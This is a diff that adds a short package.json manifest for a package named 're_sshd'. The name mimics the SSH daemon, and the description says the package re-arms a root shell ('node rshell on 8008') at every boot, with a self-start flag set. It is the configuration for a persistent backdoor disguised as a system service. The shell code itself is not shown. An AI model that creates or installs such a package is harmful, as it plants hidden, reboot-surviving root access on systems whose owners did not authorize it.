@@ -1,0 +1,10 @@
+{
+  "name": "re_sshd",
+  "version": "1.0.0",
+  "description": "re-arm the alvidaa root shell (node rshell on 8008) at every boot",
+  "main": "index.js",
+  "type": "commonjs",
+  "selfStart": true,
+  "permission": {},
+  "author": ""
+}
